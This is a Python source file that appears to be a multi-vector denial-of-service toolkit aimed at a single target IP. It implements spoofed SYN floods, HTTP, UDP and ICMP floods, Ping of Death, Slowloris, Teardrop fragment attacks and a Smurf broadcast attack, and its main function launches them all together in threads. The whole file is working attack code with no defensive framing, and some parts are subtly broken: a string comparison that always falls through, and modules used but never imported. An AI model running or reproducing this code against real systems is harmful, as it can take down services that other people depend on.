
from multiprocessing.dummy import freeze_support
import sys
from scapy.all import *
from random import randint
from multiprocessing import Process
from threading import Thread
import os
import socket
import random
import socket
import time
import string
import _thread
from tkinter import *

thread_num = 0
# SYN Flooder
def SYNFlooder(dstIP):
    def randomIP():
        ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
        return ip
    def randInt():
        x = randint(1000, 9000)
        return x
    def SYN_Flood(dstIP, dstPort, counter):
        total = 0
        print ("Packets are sending ...")

        for x in range (0, counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP ()
            IP_Packet.src = randomIP()
            IP_Packet.dst = dstIP

            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(dstPort)
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
            total+=1

        sys.stdout.write("SYN Flooder: %i\n" % total)

    SYN_Flood(dstIP,80,100000)

# HTTP Flooder
def HTTPFlooder(dstIP):
    # Parse inputs
    host = dstIP
    ip = dstIP
    port = 80
    num_requests = 1000

    

    # Create a shared variable for thread counts
    
    thread_num_mutex = threading.Lock()


    # Print thread status
    def print_status():
        global thread_num
        thread_num_mutex.acquire(True)

        thread_num += 1
        #print the output on the sameline
        sys.stdout.write(f"\r HTTP Flood: {time.ctime().split( )[3]} [{str(thread_num)}]")
        sys.stdout.flush()
        thread_num_mutex.release()


    # Generate URL Path
    def generate_url_path():
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, 5))
        return data


    # Perform the request
    def attack():
        print_status()
        url_path = generate_url_path()

        # Create a raw socket
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Open the connection on that raw socket
            dos.connect((ip, port))

            # Send the request according to HTTP spec
            #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
            dos.send(byt)
        except socket.error:
            print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
        finally:
            # Close our socket gracefully
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()


    print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads

# UDP Flooder
def UDPFlooder(dstIP):
    
    port = 1
    ip = dstIP
    dur = 60
    bytes = os.urandom(1024)
    x = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = int(0)
    timeout = time.time()+dur
    print ("UDP Flood to " + ip)
    while 1 == 1:
        try:
            if time.time()>timeout:
                break
            else:
                x.sendto(bytes,(ip, port))
                sent = sent+1
            if port == 65535:
                port = 1
            else:
                port = port+1
            
        except KeyboardInterrupt:
    
            print("did it")

#Ping Of Death
def PingOfDeath(dstIP):
    print("Ping of Death Starting")
    SOURCE_IP="10.0.1.1"
    TARGET_IP=dstIP
    MESSAGE="T"
    NUMBER_PACKETS=10000 # Number of pings

    pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
    send(NUMBER_PACKETS*pingOFDeath)
    print("Ping of Death Finished")    

# ICMP Flood
def ICMPFlood(dstIP):
    print("ICMP Flood Start")
    target = dstIP
    cycle = 1000

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())
    print("ICMP Flood Finish")

# Slow Loris Attack
def SlowLoris(dstIP):
    
    
    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    list_of_sockets = []
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    setattr(socket.socket, "send_line", send_line)
    setattr(socket.socket, "send_header", send_header)


    def init_socket(ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        s.connect((ip, 80))

        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

        ua = user_agents[0]
        
        ua = random.choice(user_agents)

        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        return s


    def slow():
        ip = dstIP
        socket_count = 150
        sleep_time = 15
        
        logging.info("Attacking %s with %s sockets.", ip, socket_count)

        logging.info("Creating sockets...")
        for _ in range(socket_count):
            try:
                logging.debug("Creating socket nr %s", _)
                s = init_socket(ip)
            except socket.error as e:
                logging.debug(e)
                break
            list_of_sockets.append(s)

        while True:
            try:
                logging.info(
                    "Sending keep-alive headers... Socket count: %s",
                    len(list_of_sockets),
                )
                for s in list(list_of_sockets):
                    try:
                        s.send_header("X-a", random.randint(1, 5000))
                    except socket.error:
                        list_of_sockets.remove(s)

                for _ in range(socket_count - len(list_of_sockets)):
                    logging.debug("Recreating socket...")
                    try:
                        s = init_socket(ip)
                        if s:
                            list_of_sockets.append(s)
                    except socket.error as e:
                        logging.debug(e)
                        break
                logging.debug("Sleeping for %d seconds", sleep_time)
                time.sleep(sleep_time)

            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping Slowloris")
                break
    
    slow()

# Teardrop Attack
def Teardrop(dstIP):

    
    target=dstIP
    attack=2

    print('Attacking target ' + target + ' with attack ' + str(attack))

    if attack == '0':
        print("Using attack 0")
        size=36
        offset=3
        load1="\x00"*size
        
        i=IP()
        i.dst=target
        i.flags="MF"
        i.proto=17
        
        size=4
        offset=18
        load2="\x00"*size

        j=IP()
        j.dst=target
        j.flags=0
        j.proto=17
        j.frag=offset

        # test with a upd package
        # u = UDP(dport=53)
        # print ('length of arbitrary payload is equal with udp pack' if u.__len__() == load1.__len__() else 'they are not equal')
        
        send(i/load1)
        send(j/load2)

    elif attack == '1':
        print ("Using attack 1")
        size=1300
        offset=80
        load="A"*size
        
        i=IP()
        i.dst=target
        i.flags="MF"
        i.proto=17
        
        j=IP()
        j.dst=target
        j.flags=0 
        j.proto=17
        j.frag=offset
        
        send(i/load)
        send(j/load)

    elif attack == '2':
        print ("Using attack 2")
        print ("Attacking with attack 2")
        size=1300
        offset=80
        load="A"*size
        
        i=IP()
        i.dst=target
        i.proto=17
        i.flags="MF"
        i.frag=0
        send(i/load)

        print ("Attack 2 packet 0")
        
        for x in range(1, 10):
            i.frag=offset
            offset=offset+80
            send(i/load)
            print ("Attack 2 packet " + str(x))
    
        i.frag=offset
        i.flags=0
        send(i/load)

    elif attack == '3':
        print ("Using attack 3")
        size=1336
        offset=3
        load1="\x00"*size
        
        i=IP()
        i.dst=target
        i.flags="MF"
        i.proto=17
        
        size=4
        offset=18
        load2="\x00"*size
        
        j=IP()
        j.dst=target
        j.flags=0
        j.proto=17
        j.frag=offset
        
        send(i/load1)
        send(j/load2)

    else:         # attack == 4
        print ("Using attack 4")
        size=1300
        offset=10
        load="A"*size
        
        i=IP()
        i.dst=target
        i.flags="MF"
        i.proto=17
        
        j=IP()
        j.dst=target
        j.flags=0
        j.proto=17
        j.frag=offset
        
        send(i/load)
        send(j/load)

    print ("Done!")

# Smurf Attack
def Smurf(dstIP):
    target = dstIP
    threadnum = 200

    def smurf(target):
    
        while True:
            send(IP(src=target, dst="192.168.113.255")/ICMP(), count=100, verbose=0)

    def attack(target):
    
        print ("Start Attack...")
    
        for i in range(threadnum):
            _thread.start_new_thread(smurf, (target, ))
        while True:
            time.sleep(1)

    attack(target)


def main(dstIP):
    
    threads = []
            
    threads.append(Thread(target=SYNFlooder,args=(dstIP,)))
    threads.append(Thread(target=HTTPFlooder,args=(dstIP,)))
    threads.append(Thread(target=UDPFlooder,args=(dstIP,)))
    threads.append(Thread(target=PingOfDeath,args=(dstIP,)))
    threads.append(Thread(target=ICMPFlood,args=(dstIP,)))
    ####threads.append(Thread(target=SlowLoris,args=(dstIP,)))
    threads.append(Thread(target=Teardrop,args=(dstIP,)))
    threads.append(Thread(target=Smurf,args=(dstIP,)))

    
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

    print("DID IT")